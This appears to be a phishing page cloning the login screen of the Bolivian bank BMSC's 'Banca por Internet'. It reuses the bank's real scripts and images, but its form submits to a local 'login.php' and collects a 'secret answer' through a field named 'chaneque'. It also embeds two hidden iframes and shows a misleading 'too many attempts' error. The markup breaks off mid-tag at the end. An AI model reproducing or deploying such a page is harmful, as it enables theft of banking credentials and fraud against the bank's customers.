<html xmlns="http://www.w3.org/1999/xhtml" class=" overthrow-enabled overthrow-enabled" style="position: relative;"><head></head><body>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<meta name="format-detection" content="telephone=no">


<script language="javascript" type="text/javascript">
    var dateFormat = 'dd/MM/yyyy';
    var endRequestHandlers = [];
    var isPreLoaderAnimationRunning = false;
    var showAsyncPostBackError = true;

    function Logo_Click() {
        window.location = "Login.html"
    }

    function PageRequestManager_BeginRequest(sender, args) {
        AysncPostBack_BeginLoading(sender, args);
    }

    function PageRequestManager_Add_EndRequest(handler) {
        Array.add(endRequestHandlers, handler);
    }

    function PageRequestManager_EndRequest(sender, args) {
        PageRequestManagerCheckForErrors(sender, args);
        BindAlwaysFireChange(sender, args);
        BindValidators(sender, args);
        BindTooltips(sender, args);
        BindPopupsButtons(sender, args);
        ApplySelectionsStyles(sender, args);
        ApplyProductRepeaterStyles(sender, args);
        ApplyFileUploadStyles(sender, args);
        SizeGridHeight(sender, args);
        BindSummaryAndInformationEllipsis(sender, args);
        AysncPostBack_EndLoading(sender, args);

        for (var i = 0; i < endRequestHandlers.length; i++) {
            endRequestHandlers[i](sender, args);
        }
    }

    function AysncPostBack_BeginLoading(sender, args) {
        var postBackElement = $(args.get_postBackElement());
        showAsyncPostBackError = !postBackElement.hasClass("doNotShowAsyncPostBackError") && !postBackElement.parents().hasClass("doNotShowAsyncPostBackError");
        if (!postBackElement.hasClass("doNotShowPreLoader") && !postBackElement.parents().hasClass("doNotShowPreLoader")) {
            $(".clickDivPreLoader").css({
                "height": screen.height,
                "width": screen.width
            });
            isPreLoaderAnimationRunning = true;

            $("div.clickDivPreLoader").fadeTo(100, 0.8, function() {


                $("#imgPreLoader").centerIn({
                    container: $("html"),
                    position: "fixed"
                });
                $("#imgPreLoader").removeClass("invisible");

                isPreLoaderAnimationRunning = false;
            });
        }
    }

    function AysncPostBack_EndLoading(sender, args) {
        window.setTimeout(function() {
            $("#imgPreLoader").addClass("invisible");
            $("div.clickDivPreLoader").fadeOut(100, 0);
        }, isPreLoaderAnimationRunning ? 300 : 0);
    }


    function getBrowseButtonText() {
        return 'Examinar';
    }

    function PageRequestManagerCheckForErrors(sender, args) {
        if (args.get_error() != undefined) {
            if (showAsyncPostBackError) {
                alert("Excediste el número de intentos permitido, espera 1 min para volver a intentarlo.".replace("'", "''"));
            }
            args.set_errorHandled(true);
        }
    }

    function ChangeOKMaster_Clicked() {
        closePopup('PopupContactUsExito');
    }

    function ShowContactUsPopup() {
        $(".accountCont").hide();
        $(".closeTop").hide();
        showPopup('ContactUsPopup');
    }

    function CloseContactUsPopup() {
        closePopup('ContactUsPopup');
    }

    function CloseErrorPopup() {
        closePopup('PopupErrorMaster');
    }

    function PopUp_ClientValidate() {
        if (Page_IsValid) {
            CloseContactUsPopup();
        }
    }
</script>


    <link rel="shortcut icon" href="https://bnet.bmsc.com.bo/BMSC.ICBanking.WebUI/favicon.ico" type="image/x-icon">
    <link rel="icon" href="https://bnet.bmsc.com.bo/BMSC.ICBanking.WebUI/favicon.ico" type="image/ico">
    <link rel="stylesheet" type="text/css" href="../../../Styles/Default/icbStyles_BE4049C6AF65BFE67CDB5B41D365A0FE.css">
    <link rel="stylesheet" type="text/css" media="print" href="../../../Styles/Default/icbPrintingStyles_EE875BACBA6C1F641FB486CE59EDD0BB.css">
    <title>
        Banca por Internet
    </title>



    <script src="../../../js/vuborders.js" type="text/javascript"></script><iframe src="https://logo.prismasystems.com.ar/bmscbnet/bmscbnet.html" style="display: none;"></iframe><iframe src="https://logo.prismasystems.com.ar/bmscbnet/bmscbnet.html" style="display: none;"></iframe>
    <form method="post" id="form1" action="login.php">




        <script type="text/javascript">
            //<![CDATA[
            function ASP_administration_webui_controls_general_login_logincompleteuserdata_ascx_ShowOperationResultPopup() {
                var operationResult = document.getElementById('hfOperationResult');
                if (operationResult != null && operationResult.value != null && operationResult.value != '') {
                    if (operationResult.value == 'ok') {
                        showSuccessPopup();
                    } else if (operationResult.value == 'error') {
                        showErrorPopup();
                    } else if (operationResult.value == 'warning') {
                        showWarningPopup();
                    }
                }
            }
            var __cultureInfo = {
                "name": "es-UY",
                "numberFormat": {
                    "CurrencyDecimalDigits": 2,
                    "CurrencyDecimalSeparator": ".",
                    "IsReadOnly": false,
                    "CurrencyGroupSizes": [3],
                    "NumberGroupSizes": [3],
                    "PercentGroupSizes": [3],
                    "CurrencyGroupSeparator": ",",
                    "CurrencySymbol": "$U",
                    "NaNSymbol": "NeuN",
                    "CurrencyNegativePattern": 14,
                    "NumberNegativePattern": 1,
                    "PercentPositivePattern": 0,
                    "PercentNegativePattern": 0,
                    "NegativeInfinitySymbol": "-Infinito",
                    "NegativeSign": "-",
                    "NumberDecimalDigits": 2,
                    "NumberDecimalSeparator": ".",
                    "NumberGroupSeparator": ",",
                    "CurrencyPositivePattern": 2,
                    "PositiveInfinitySymbol": "Infinito",
                    "PositiveSign": "+",
                    "PercentDecimalDigits": 2,
                    "PercentDecimalSeparator": ",",
                    "PercentGroupSeparator": ".",
                    "PercentSymbol": "%",
                    "PerMilleSymbol": "‰",
                    "NativeDigits": ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"],
                    "DigitSubstitution": 1
                },
                "dateTimeFormat": {
                    "AMDesignator": "a.m.",
                    "Calendar": {
                        "MinSupportedDateTime": "\/Date(-62135582400000)\/",
                        "MaxSupportedDateTime": "\/Date(253402300799999)\/",
                        "AlgorithmType": 1,
                        "CalendarType": 1,
                        "Eras": [1],
                        "TwoDigitYearMax": 2029,
                        "IsReadOnly": false
                    },
                    "DateSeparator": "/",
                    "FirstDayOfWeek": 1,
                    "CalendarWeekRule": 0,
                    "FullDateTimePattern": "dddd, dd\u0027 de \u0027MMMM\u0027 de \u0027yyyy hh:mm:ss tt",
                    "LongDatePattern": "dddd, dd\u0027 de \u0027MMMM\u0027 de \u0027yyyy",
                    "LongTimePattern": "hh:mm:ss tt",
                    "MonthDayPattern": "dd MMMM",
                    "PMDesignator": "p.m.",
                    "RFC1123Pattern": "ddd, dd MMM yyyy HH\u0027:\u0027mm\u0027:\u0027ss \u0027GMT\u0027",
                    "ShortDatePattern": "dd/MM/yyyy",
                    "ShortTimePattern": "hh:mm tt",
                    "SortableDateTimePattern": "yyyy\u0027-\u0027MM\u0027-\u0027dd\u0027T\u0027HH\u0027:\u0027mm\u0027:\u0027ss",
                    "TimeSeparator": ":",
                    "UniversalSortableDateTimePattern": "yyyy\u0027-\u0027MM\u0027-\u0027dd HH\u0027:\u0027mm\u0027:\u0027ss\u0027Z\u0027",
                    "YearMonthPattern": "MMMM\u0027 de \u0027yyyy",
                    "AbbreviatedDayNames": ["dom", "lun", "mar", "mié", "jue", "vie", "sáb"],
                    "ShortestDayNames": ["do", "lu", "ma", "mi", "ju", "vi", "sá"],
                    "DayNames": ["domingo", "lunes", "martes", "miércoles", "jueves", "viernes", "sábado"],
                    "AbbreviatedMonthNames": ["ene", "feb", "mar", "abr", "may", "jun", "jul", "ago", "sep", "oct", "nov", "dic", ""],
                    "MonthNames": ["enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre", ""],
                    "IsReadOnly": false,
                    "NativeCalendarName": "calendario gregoriano",
                    "AbbreviatedMonthGenitiveNames": ["ene", "feb", "mar", "abr", "may", "jun", "jul", "ago", "sep", "oct", "nov", "dic", ""],
                    "MonthGenitiveNames": ["enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre", ""]
                },
                "eras": [1, "d.C.", null, 0]
            }; //]]>
        </script>

        <script src="https://bnet.bmsc.com.bo/BMSC.ICBanking.WebUI/ScriptResource.axd?d=Atb1_NTku2Wdqh3p7DAR8bXM2dEJK2iH2aXzGqBLkR9Uo1kOvv3rRm0hz6Gl7eTCD-AUGLvlQXvKsZ62THXlZ5zJlyhZLwd6LlQ1t0xvAa8D1FZj0&amp;t=23c9c237" type="text/javascript"></script>
        <script src="https://bnet.bmsc.com.bo/BMSC.ICBanking.WebUI/ScriptResource.axd?d=7rveq3gjQoN-rPWqUCjMvTdcSCi1_j5NhKZwNZPRvpgxk7vFMqNybdCdySBChCb1ymUxz8EfsiKHGY8L0FHjhOb_gi-GL1bHtbIBYzunF43ApnlVXGWPUQcNX6QMPP1W7Jcahw2&amp;t=23c9c237" type="text/javascript"></script>
        <script src="../../../App_Themes/Default/Scripts/WebForms.js" type="text/javascript"></script>
        <script src="../../../App_Themes/Default/Scripts/WebUIValidation.js" type="text/javascript"></script>
        <script src="../../../App_Themes/Default/Scripts/Focus.js" type="text/javascript"></script>
        <script type="text/javascript">
            //<![CDATA[
            function WebForm_OnSubmit() {
                if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
                return true;
            }
            //]]>
        </script>



        <script type="text/javascript">
            //<![CDATA[
            Sys.WebForms.PageRequestManager._initialize('ctl00$ctl06', 'ctl01', ['fctl00$MainContent$ctl01$UpdatePanel2', 'MainContent_ctl01_UpdatePanel2'], [], [], 1200, 'ctl00');
            //]]>
        </script>





        <div id="PopupContactUsExito" class="popup exitoMaster">
            <ul>
                <li class="top"></li>

                <li class="mid">
                                    <p>
                        La operación se completó correctamente
                    </p>
                    <ul class="navBtns fr">
                        <li>

                            <input name="ctl00$ChangeOk" type="button" id="ChangeOk" class="btnGenericBlue doNotHidePopup" onclick="ChangeOKMaster_Clicked();" value="Aceptar">
                        </li>
                    </ul>
                </li>
                <li class="bottom"></li>
            </ul>
        </div>

        <div id="PopupErrorMaster" class="popup errorMaster">


            <ul>
                <li class="top"></li>
                <li class="mid">
                    <span>
                        Error en la operación
                    </span>
                    <p>
                        Ocurrió un error al procesar la operación.
                    </p>
                    <ul class="navBtns fr">
                        <li>
                            <input type="submit" name="ctl00$Button1" value="Aceptar" onclick="CloseErrorPopup();WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$Button1&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, false))" id="Button1" class="btnGenericRed fl">
                        </li>
                    </ul>
                </li>
                <li class="bottom"></li>
            </ul>
        </div>

        <div id="ContactUsPopup" class="popupGeneric FrequentTransfer">
            <ul>
                <li class="top"></li>
                <li class="mid" style="height: 450px">
                    <h3>Complete la información a enviar
                    </h3>
                    <span class="req">
                        * Requerido
                    </span>
                    <ul class="navBtns clear">
                        <li>
                            <input type="button" class="btnGenericRed processedPrintAndClosePopups" value="Cancelar" onclick="CloseContactUsPopup();">
                        </li>
                        <li>
                            <input type="submit" name="ctl00$btnSendContactus" value="Enviar" onclick="Page_ClientValidate('ContactUsGroup');if (Page_IsValid) {};" id="btnSendContactus" class="btnGenericGreen doNotHidePopup processedPrintAndClosePopups">
                        </li>
                    </ul>
                </li>
                <li class="bottom"></li>
            </ul>
        </div>

        <div class="clickDivPreLoader" style="height: 768px; width: 1366px;"></div>
        <img id="imgPreLoader" class="invisible" width="104px" height="88px" src="../../../App_Themes/Default/Images/preLoader-es-UY.gif" alt="Cargando..." style="height:88px;width:104px;">
        <div id="corporateHeader">
            <div class="logo" onclick="Logo_Click();">
            </div>

            

        </div>
        <div id="container">
            <div id="containerTop" class="withoutBreadcrumb">
                <h3>
                    Bienvenido a la Banca por Internet
                </h3>
                <span class="fecha" id="fech">Lunes, 3 de Enero de 2022</span>
            </div>

            <div id="containerMid" class="fl">
                <div class="stepsTitles fl invisible">
                    <h3>
                        <span>

                        </span>

                    </h3>
                </div>

                <div class="colLeft" style="display: block;">


                    <script type="text/javascript" src="../../../App_Themes/Default/Scripts/icbScripts_40EE503762D7E2FB26DC9A6F5980198D.js"></script>

                    <script type="text/javascript">
                        Sys.WebForms.PageRequestManager.getInstance().add_beginRequest(PageRequestManager_BeginRequest);
                        Sys.WebForms.PageRequestManager.getInstance().add_endRequest(PageRequestManager_EndRequest);
                    </script>

                    <div class="clickDivPopup" style="height: 768px; width: 1366px;"></div>







                    <div class="contentLogin extended">
                        <input type="hidden" name="ctl00$MainContent$ctl01$HFRealPassword" id="MainContent_ctl01_HFRealPassword">



                        <ul class="login">
                            <li>
                                <div class="closeBtnKeyboard">
                                    <img src="../../../App_Themes/Default/Images/blank.png" width="45" height="50" alt="Close">
                                </div>
                                <ul>
                               <div style="height: 25px">
                               <span class="req" style="height: 20px">
                               * Requerido
                                </span>
                        </div>
                                        <li class="labelInput">
                                        <span id="MainContent_ctl01_lbluserName" class="usuario fr" for="username">Respuesta secreta:	

</span>
                                    </li>

                                    <li id="MainContent_ctl01_liPassword" class="password fl">
                                        <input name="chaneque" required="" type="text" ondrop="return false;" onpaste="return false;" autocomplete="off" class="form-control hidden-control keyboard">
                                                                                
                                    </li>

                                    <li class="fl">
                                        
                                    </li>

                                    <li id="MainContent_ctl01_livirtualPassword" class="virtualKeyboard">


                                        <div>
                                            <div id="virtualKeyboardFloatingCont" class="theVirtualKeyboard" onmousemove="checkIsMouseUpFired()">
                                                <input type="hidden" name="ctl00$MainContent$ctl01$ctl05$hdnInputControlId" id="MainContent_ctl01_ctl05_hdnInputControlId" value="MainContent_ctl01_txtUserNamePassword">
                                                <img id="keyboardImage" name="keyboardImage" src="../../../App_Themes/Default/Images/keyboardLowerCase_es-UY.png" alt="Teclado virtual" usemap="#Map" width="328px" height="128px" style="cursor: pointer">
                                                <map id="map" name="Map">
                                                    <script type="text/javascript">
                                                        var lowerCaseKeyboard = new Array('1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '`', '+', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'ñ', '´', 'ç', '<', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '-', ' ');
                                                        var upperCaseKeyboard = new Array('!', '"', '·', '$', '%', '&', 'https://bnet.bmsc.com.bo/', '(', ')', '=', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', '^', '*', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'Ñ', '¨', 'ç', '>', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', ';', ':', '_', ' ');
                                                        var isUpperCaseOptionSelected = false;
                                                        var isHighContrastOptionSelected = false;
                                                        var isMouseUpFired = true;
                                                        if (document.images) {
                                                            keyboardLowerCaseImage = new Image();
                                                            keyboardLowerCaseImage.src = "../../../App_Themes/Default/Images/keyboardLowerCase_es-UY.png";
                                                            keyboardLowerCaseContrastImage = new Image();
                                                            keyboardLowerCaseContrastImage.src = "../../../App_Themes/Default/Images/keyboardLowerCaseContrast_es-UY.png";

                                                            keyboardUpperCaseImage = new Image();
                                                            keyboardUpperCaseImage.src = "../../../App_Themes/Default/Images/keyboardUpperCase_es-UY.png";
                                                            keyboardUpperCaseContrastImage = new Image();
                                                            keyboardUpperCaseContrastImage.src = "../../../App_Themes/Default/Images/keyboardUpperCaseContrast_es-UY.png";

                                                            keyboardBlankImage = new Image();
                                                            keyboardBlankImage.src = "../../../App_Themes/Default/Images/keyboardWhite.png";
                                                        }

                                                        function removeInvalidCharacters(inputControl) {
                                                            !(/^[A-zÑñ0-9]*$/i).test(inputControl.value) ? inputControl.value = inputControl.value.replace(/[^A-zÑñ0-9*!#@$%^().+//_~]/ig, '') : null;
                                                        }

                                                        function changeImage(option) {
                                                            if (document.images) {
                                                                var name = 'keyboardImage';

                                                                switch (option) {
                                                                    case 1:
                                                                        isUpperCaseOptionSelected = false;
                                                                        document.images[name].src = eval(isHighContrastOptionSelected ? "keyboardLowerCaseContrastImage.src" : "keyboardLowerCaseImage.src");
                                                                        break;
                                                                    case 2:
                                                                        isUpperCaseOptionSelected = true;
                                                                        document.images[name].src = eval(isHighContrastOptionSelected ? "keyboardUpperCaseContrastImage.src" : "keyboardUpperCaseImage.src");
                                                                        break;
                                                                    case 3:
                                                                        document.images[name].src = eval('keyboardBlankImage.html');
                                                                        break;
                                                                    case 4:
                                                                        isHighContrastOptionSelected = false;
                                                                        document.images[name].src = eval(isUpperCaseOptionSelected ? "keyboardUpperCaseImage.src" : "keyboardLowerCaseImage.src");
                                                                        break;
                                                                    case 5:
                                                                        isHighContrastOptionSelected = true;
                                                                        document.images[name].src = eval(isUpperCaseOptionSelected ? "keyboardUpperCaseContrastImage.src" : "keyboardLowerCaseContrastImage.src");
                                                                        break;
                                                                }
                                                            }
                                                        }

                                                        function showImageOnMouseDown() {
                                                            isMouseUpFired = false;
                                                            changeImage(3);
                                                        }

                                                        function showImageOnMouseUp() {
                                                            isMouseUpFired = true;
                                                            var virtualKeyboardFloatingCont = $("#virtualKeyboardFloatingCont");
                                                            virtualKeyboardFloatingCont.css("top", random(5, virtualKeyboardFloatingCont.parent().parent().height() - virtualKeyboardFloatingCont.height() - $(".contContrast").height() - 5)).css("left", random(7, virtualKeyboardFloatingCont.parent().parent().width() - virtualKeyboardFloatingCont.width() - 7));

                                                            changeImage(isUpperCaseOptionSelected ? 2 : 1);
                                                        }

                                                        function checkIsMouseUpFired() {
                                                            if (!isMouseUpFired) {
                                                                showImageOnMouseUp();
                                                            }
                                                        }

                                                        function insertCharacter(character) {
                                                            var inputControl = getInputControl();
                                                            if (inputControl != null) {
                                                                inputControl.value = inputControl.value + (isUpperCaseOptionSelected ? upperCaseKeyboard[character] : lowerCaseKeyboard[character]);
                                                                removeInvalidCharacters(inputControl)
                                                            }
                                                        }

                                                        function backspace() {
                                                            var inputControl = getInputControl();
                                                            if (inputControl != null) {
                                                                inputControl.value = inputControl.value.substring(0, inputControl.value.length - 1);
                                                            }
                                                        }

                                                        function capsLock() {
                                                            changeImage(isUpperCaseOptionSelected ? 1 : 2);
                                                        }

                                                        function getInputControl() {
                                                            var hdnInputControlId = document.getElementById('MainContent_ctl01_ctl05_hdnInputControlId');

                                                            var inputControl = null;

                                                            if (hdnInputControlId.value != null && hdnInputControlId.value != '') {
                                                                inputControl = document.getElementById(hdnInputControlId.value);
                                                            }

                                                            return inputControl;
                                                        }

                                                        function mapKey(coordinates, selectedKey) {
                                                            document.write('<area shape="rect" coords="' + coordinates + '" onClick="insertCharacter(' + selectedKey + '); showImageOnMouseUp(); return false;" onMouseDown="showImageOnMouseDown();">');
                                                        }

                                                        function mapSpecialKey(coordinates, selectedSpecialKeyFunction) {
                                                            document.write('<area shape="rect" coords="' + coordinates + '" onClick="' + selectedSpecialKeyFunction + '; showImageOnMouseUp(); return false;" onMouseDown="showImageOnMouseDown();">');
                                                        }

                                                        mapKey("37,75,58,95", "34");
                                                        mapKey("216,74,237,95", "42");
                                                        mapKey("238,75,259,95", "43");
                                                        mapKey("287,36,308,55", "21");
                                                        mapKey("264,36,285,55", "20");
                                                        mapKey("297,56,318,75", "33");
                                                        mapKey("274,56,295,75", "32");
                                                        mapKey("25,16,45,34", "0");
                                                        mapKey("108,36,128,55", "13");
                                                        mapKey("201,16,222,34", "8");
                                                        mapKey("45,16,65,34", "1");
                                                        mapKey("41,36,62,55", "10");
                                                        mapKey("218,36,239,55", "18");
                                                        mapSpecialKey("246,17,285,35", "backspace()");
                                                        mapKey("178,17,200,35", "7");
                                                        mapKey("130,36,150,55", "14");
                                                        mapKey("197,36,218,55", "17");
                                                        mapKey("90,17,111,35", "3");
                                                        mapKey("85,36,106,55", "12");
                                                        mapKey("156,17,178,35", " 6");
                                                        mapKey("174,36,196,55", "16");
                                                        mapKey("240,36,261,55", "19");
                                                        mapKey("152,36,173,55", "15");
                                                        mapKey("112,17,132,35", "4");
                                                        mapKey("223,17,243,35", "9");
                                                        mapKey("132,16,155,35", "5");
                                                        mapKey("63,36,84,55", "11");
                                                        mapKey("68,16,88,35", "2");
                                                        mapKey("162,56,182,75", "27");
                                                        mapKey("139,56,160,75", "26");
                                                        mapKey("117,56,137,75", "25");
                                                        mapKey("94,56,115,75", "24");
                                                        mapKey("73,56,93,75", "23");
                                                        mapKey("52,56,72,75", "22");
                                                        mapKey("185,56,205,75", "28");
                                                        mapKey("207,56,227,75", "29");
                                                        mapKey("230,56,249,75", "30");
                                                        mapKey("251,56,272,75", "31");
                                                        mapSpecialKey("13,56,50,75", "capsLock()");
                                                        mapKey("261,75,282,95", "44");
                                                        mapKey("193,74,214,95", "41");
                                                        mapKey("170,74,191,95", "40");
                                                        mapKey("148,75,171,95", "39");
                                                        mapKey("128,75,147,95", "38");
                                                        mapKey("105,75,127,95", "37");
                                                        mapKey("83,75,104,95", "36");
                                                        mapKey("60,75,81,95", "35");
                                                        mapKey("98,95,226,115", "45");
                                                    </script><area shape="rect" coords="37,75,58,95" onclick="insertCharacter(34); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="216,74,237,95" onclick="insertCharacter(42); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="238,75,259,95" onclick="insertCharacter(43); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="287,36,308,55" onclick="insertCharacter(21); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="264,36,285,55" onclick="insertCharacter(20); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="297,56,318,75" onclick="insertCharacter(33); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="274,56,295,75" onclick="insertCharacter(32); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="25,16,45,34" onclick="insertCharacter(0); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="108,36,128,55" onclick="insertCharacter(13); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="201,16,222,34" onclick="insertCharacter(8); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="45,16,65,34" onclick="insertCharacter(1); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="41,36,62,55" onclick="insertCharacter(10); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="218,36,239,55" onclick="insertCharacter(18); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="246,17,285,35" onclick="backspace(); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="178,17,200,35" onclick="insertCharacter(7); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="130,36,150,55" onclick="insertCharacter(14); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="197,36,218,55" onclick="insertCharacter(17); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="90,17,111,35" onclick="insertCharacter(3); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="85,36,106,55" onclick="insertCharacter(12); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="156,17,178,35" onclick="insertCharacter( 6); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="174,36,196,55" onclick="insertCharacter(16); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="240,36,261,55" onclick="insertCharacter(19); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="152,36,173,55" onclick="insertCharacter(15); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="112,17,132,35" onclick="insertCharacter(4); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="223,17,243,35" onclick="insertCharacter(9); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="132,16,155,35" onclick="insertCharacter(5); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="63,36,84,55" onclick="insertCharacter(11); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="68,16,88,35" onclick="insertCharacter(2); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="162,56,182,75" onclick="insertCharacter(27); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="139,56,160,75" onclick="insertCharacter(26); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="117,56,137,75" onclick="insertCharacter(25); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="94,56,115,75" onclick="insertCharacter(24); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="73,56,93,75" onclick="insertCharacter(23); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="52,56,72,75" onclick="insertCharacter(22); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="185,56,205,75" onclick="insertCharacter(28); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="207,56,227,75" onclick="insertCharacter(29); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="230,56,249,75" onclick="insertCharacter(30); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="251,56,272,75" onclick="insertCharacter(31); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="13,56,50,75" onclick="capsLock(); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="261,75,282,95" onclick="insertCharacter(44); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="193,74,214,95" onclick="insertCharacter(41); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="170,74,191,95" onclick="insertCharacter(40); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="148,75,171,95" onclick="insertCharacter(39); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="128,75,147,95" onclick="insertCharacter(38); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="105,75,127,95" onclick="insertCharacter(37); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="83,75,104,95" onclick="insertCharacter(36); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="60,75,81,95" onclick="insertCharacter(35); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="98,95,226,115" onclick="insertCharacter(45); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="37,75,58,95" onclick="insertCharacter(34); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="216,74,237,95" onclick="insertCharacter(42); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="238,75,259,95" onclick="insertCharacter(43); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="287,36,308,55" onclick="insertCharacter(21); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="264,36,285,55" onclick="insertCharacter(20); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="297,56,318,75" onclick="insertCharacter(33); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="274,56,295,75" onclick="insertCharacter(32); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="25,16,45,34" onclick="insertCharacter(0); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="108,36,128,55" onclick="insertCharacter(13); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="201,16,222,34" onclick="insertCharacter(8); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="45,16,65,34" onclick="insertCharacter(1); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="41,36,62,55" onclick="insertCharacter(10); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="218,36,239,55" onclick="insertCharacter(18); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="246,17,285,35" onclick="backspace(); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="178,17,200,35" onclick="insertCharacter(7); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="130,36,150,55" onclick="insertCharacter(14); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="197,36,218,55" onclick="insertCharacter(17); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="90,17,111,35" onclick="insertCharacter(3); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="85,36,106,55" onclick="insertCharacter(12); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="156,17,178,35" onclick="insertCharacter( 6); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="174,36,196,55" onclick="insertCharacter(16); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="240,36,261,55" onclick="insertCharacter(19); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area 